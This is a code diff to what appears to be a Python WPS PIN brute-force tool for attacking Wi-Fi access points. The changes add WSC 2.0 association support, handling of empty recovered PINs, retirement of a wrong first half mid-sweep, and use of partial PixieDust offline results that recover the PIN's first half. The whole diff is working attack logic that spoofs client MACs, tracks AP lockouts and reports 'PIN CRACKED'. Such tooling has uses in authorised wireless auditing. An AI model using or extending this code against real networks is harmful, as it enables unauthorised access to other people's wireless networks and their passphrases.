@@ -60,6 +60,9 @@ class CampaignState:
     updated: float = 0.0
 
 
+EMPTY_PIN_LABEL = "<empty>"   # a recovered zero-length device password has no digits to show
+
+
 def _state_path(state_dir, bssid: str) -> Path:
     return Path(state_dir) / f"wps_{bssid.lower().replace(':', '-')}.run"
 
@@ -78,7 +81,7 @@ def load_run_state(state_dir, bssid: str) -> Optional[CampaignState]:
 
 def run_progress_line(state: CampaignState) -> Optional[str]:
     """One-line WPS-PIN sweep progress (rich markup) for the Focus history, or None."""
-    if state.found_pin:
+    if state.found_pin is not None:
         return None  # the _wps_pin.txt row already reports the win
     if state.phase == "failed":
         return (f"[bold]WPS PIN[/bold] sweep [red]exhausted[/red] "
@@ -112,9 +115,9 @@ def wps_status_markup(camp) -> str:
     """Compact WPS-PIN campaign status: PIN progress + soft/hard lock state."""
     from rich.markup import escape
     st = camp.state
-    if st.found_pin:
+    if st.found_pin is not None:
         return (f"[black bold on cyan] PIN CRACKED: ✓ "
-                f"{escape(st.found_pin)} [/black bold on cyan]")
+                f"{escape(st.found_pin or EMPTY_PIN_LABEL)} [/black bold on cyan]")
     tested = _compact_count(st.tested)
     if camp.status == "locked":
         # Countdown updates each tick
@@ -171,9 +174,9 @@ class WpsCampaign(Campaign):
 
     def status_headlines(self, vault) -> list[str]:
         from rich.markup import escape
-        if self.state.found_pin:
+        if self.state.found_pin is not None:
             return ["[black bold on green] ✓ WPS PIN cracked [/black bold on green]",
-                    f"[dim]PIN {escape(self.state.found_pin)}[/dim]"]
+                    f"[dim]PIN {escape(self.state.found_pin or EMPTY_PIN_LABEL)}[/dim]"]
         return ["[bold cyan]● WPS PIN brute-force[/bold cyan]",
                 f"[dim]{wps_status_markup(self)}[/dim]"]
 
@@ -187,6 +190,7 @@ class WpsCampaign(Campaign):
         self.attempt_delay = attempt_delay
 
         self.our_mac = random_client_mac()
+        self.wsc_2_0 = target.wps_version == "2.0"
         self.assoc: Optional[Association] = None
         self.transport: Optional[WlanTransport] = None
         self._lease = None
@@ -239,12 +243,13 @@ class WpsCampaign(Campaign):
                 data = json.loads(path.read_text())
                 data.setdefault("bssid", self.bssid)
                 st = CampaignState(**{k: data[k] for k in data if k in CampaignState.__annotations__})
-                if st.found_pin:
+                if st.found_pin is not None:
                     # Previous run recovered the PIN. The user clicking WPS PIN
                     # again means "verify against the live AP", handled by
                     # _run switching to the "verify" phase.
                     self.log(f"resumed campaign: previously recovered PIN "
-                             f"[black bold on cyan] {st.found_pin} [/black bold on cyan]")
+                             f"[black bold on cyan] {st.found_pin or EMPTY_PIN_LABEL} "
+                             f"[/black bold on cyan]")
                 elif st.first_half:
                     # In-progress with first-half locked in. Surface it.
                     self.log(f"resumed campaign: [cyan]{st.tested:,}[/cyan]"
@@ -317,7 +322,7 @@ class WpsCampaign(Campaign):
                     self.our_mac = str_to_mac(self._lease.mac)
             self.assoc = Association(self.iface, self.bssid, self.target.ssid or "",
                                      self.channel, our_mac=self.our_mac,
-                                     assoc_trailer_ies=wps_assoc_ie(WPS_REQ_REGISTRAR),
+                                     assoc_trailer_ies=wps_assoc_ie(WPS_REQ_REGISTRAR, self.wsc_2_0),
                                      should_stop=lambda: self.stopped)
             self.assoc.start()
             self.transport = WlanTransport(self.iface, str_to_mac(self.bssid), self.our_mac)
@@ -332,6 +337,7 @@ class WpsCampaign(Campaign):
             return AttemptOutcome(PinResult.PROTO_ERROR, pin, detail="assoc failed")
         self.transport.drain()
         reg = WpsRegistrar(self.transport, str_to_mac(self.bssid), self.our_mac,
+                           channel=self.channel, wsc_2_0=self.wsc_2_0,
                            tx_ack=self._tx_ack,
                            ack_resends=self._ack_resends if self._tx_ack else 0,
                            should_stop=lambda: self.stopped)
@@ -407,13 +413,19 @@ class WpsCampaign(Campaign):
                 st.p2_index += 1
         elif out.result is PinResult.FIRST_HALF_WRONG:
             # This first half is dead
+            first4 = pin[:4]
             if st.phase == "common":
-                first4 = pin[:4]
                 if first4 not in st.dead_first_halves:
                     st.dead_first_halves.append(first4)
                 st.common_index += 1
             elif st.phase == "first_half":
                 st.p1_index += 1
+            elif st.phase == "second_half":
+                # First-half-wrong during second-half phase: retire the half, resume the sweep
+                if first4 not in st.dead_first_halves:
+                    st.dead_first_halves.append(first4)
+                st.first_half, st.skip_middle, st.p2_index = None, None, 0
+                st.phase = "common"
 
     def _apply_verify_outcome(self, pin: str, out: AttemptOutcome) -> None:
         """Resume-time re-verification of a previously-recovered PIN."""
@@ -474,7 +486,7 @@ class WpsCampaign(Campaign):
                      f"default PIN(s)[/bold][/dim]")
 
         # When resuming with a previously-recovered PIN, re-verify it against the AP
-        if self.state.phase == "done" and self.state.found_pin:
+        if self.state.phase == "done" and self.state.found_pin is not None:
             self.log("re-verifying PIN against the AP "
                      "[dim](if the PSK changed, we'll catch it)[/dim]")
             self.state.phase = "verify"
@@ -508,7 +520,7 @@ class WpsCampaign(Campaign):
 
                 pin = self._next_pin()
                 if pin is None:
-                    self.status = "found" if self.state.found_pin else "failed"
+                    self.status = "found" if self.state.found_pin is not None else "failed"
                     break
 
                 self.status = "running"
@@ -566,6 +578,9 @@ class WpsCampaign(Campaign):
                     self._save_state()
                 if self.attempt_delay:
                     await asyncio.sleep(self.attempt_delay)
+            logger.info("WPS campaign %s on %s after %d attempt(s)%s", self.status, name,
+                        self.state.attempts,
+                        f": {self.fail_reason}" if self.fail_reason else "")
         except Exception as e:
             logger.exception("WPS campaign crashed")
             self.status = "error"
@@ -668,22 +683,30 @@ class WpsCampaign(Campaign):
             worker.kill()
 
     async def _try_pixie(self, pin: str, out: AttemptOutcome) -> bool:
-        """Run Pixie once after M3 capture; verify any recovered PIN online next."""
+        """Run Pixie once after M3 capture; verify a recovered PIN (or finish a proved first half)
+        online next."""
         if self._pixie_tried or self.state.phase == "verify" or out.pixie is None:
             return False
         self._pixie_tried = True
         self.log(f"{self._attempt_prefix(pin)} → trying [cyan]PixieDust[/] offline…")
         result = await self._run_pixie(out.pixie)
-        if not result.found or result.pin is None:
-            if not self.stopped:   # an abandoned search didn't search, so it found nothing to say
-                self.log(f"{self._cont_align()} → [dim italic]no PixieDust matches found[/]")
-            return False
-        self.state.found_pin = result.pin
-        self.state.phase = "verify"
         mode = result.mode.name if result.mode is not None else "UNKNOWN"
-        self.log(f"{self._cont_align()} → [bold bright_green]PixieDust found:[/] "
-                 f"[cyan bold]{result.pin}[/] [dim]({mode}; verifying)[/]")
-        return True
+        if result.pin is not None:
+            self.state.found_pin = result.pin
+            self.state.phase = "verify"
+            self.log(f"{self._cont_align()} → [bold bright_green]PixieDust found:[/] "
+                     f"[cyan bold]{result.pin or EMPTY_PIN_LABEL}[/] [dim]({mode}; verifying)[/]")
+            return True
+        if result.first_half is not None and not out.first_half_ok:
+            st = self.state
+            st.first_half, st.phase, st.p2_index = result.first_half, "second_half", 0
+            st.skip_middle = None   # nothing tried online yet, so sweep all 1000 tails
+            self.log(f"{self._cont_align()} → [bold bright_green]PixieDust half:[/] P1 "
+                     f"[cyan bold]{result.first_half}[/] [dim]({mode}; second half online)[/]")
+            return True
+        if not self.stopped:   # an abandoned search didn't search, so it found nothing to say
+            self.log(f"{self._cont_align()} → [dim italic]no PixieDust matches found[/]")
+        return False
 
     def _should_retry_lost_reply(self, pin: str, out: AttemptOutcome) -> bool:
         """True if this half-wrong was inferred from *silence* on an AP we know NACKs."""
@@ -743,9 +766,11 @@ class WpsCampaign(Campaign):
             return
         first_half_just_confirmed = (
             self.state.first_half is not None and prev_first_half is None)
+        first_half_retired = (
+            self.state.first_half is None and prev_first_half is not None)
 
         sig = (pin, out.result)
-        if sig == self._last_attempt_sig and not first_half_just_confirmed:
+        if sig == self._last_attempt_sig and not (first_half_just_confirmed or first_half_retired):
             return  # Avoid duplicate attempt logs
         self._last_attempt_sig = sig
 
@@ -753,6 +778,10 @@ class WpsCampaign(Campaign):
         if first_half_just_confirmed:
             self.log(f"{label} → [bold bright_green]first half OK[/bold bright_green] "
                      f"[dim bold]\\[M5][/dim bold]")
+            return
+        if first_half_retired:
+            self.log(f"{label} → [red]first half wrong[/red] [dim bold]\\[M4][/dim bold] "
+                     f"[yellow](half {prev_first_half} was wrong, resuming the sweep)[/yellow]")
             return
         if out.result is PinResult.FIRST_HALF_WRONG:
             self.log(f"{label} → [red]first half wrong[/red] [dim bold]\\[M4][/dim bold]")
